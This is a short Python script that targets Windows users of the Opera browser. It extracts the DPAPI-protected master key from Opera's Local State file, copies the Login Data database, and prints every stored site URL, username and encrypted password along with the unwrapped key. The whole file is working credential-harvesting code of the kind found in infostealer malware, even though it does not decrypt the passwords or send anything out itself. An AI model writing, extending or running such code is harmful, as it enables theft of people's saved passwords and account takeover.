import os
import json
import base64
import sqlite3
import win32crypt
import shutil

temp_db = "Loginvault.db"

def get_master_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable\Local State')
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # Remove 'DPAPI' prefix
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def find_login_db():
    base_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable')
    candidates = ["", "Default", "Profile 1", "Profile 2","Profile 3","Profile 4","Profile 5"]
    for folder in candidates:
        if folder:
            path = os.path.join(base_path, folder, "Login Data")
        else:
            path = os.path.join(base_path, "Login Data")
        if os.path.exists(path):
            return path
    return None

if __name__ == '__main__':
    master_key = get_master_key()
    login_db_path = find_login_db()

    if not login_db_path:
        exit()

    shutil.copy2(login_db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        print("Url:", url)
        print("Username:", username)
        print("Cipher Text:", ciphertext)

    print("Master key:", master_key)
    cursor.close()
    conn.close()

    try:
        os.remove(temp_db)
    except Exception:
        pass
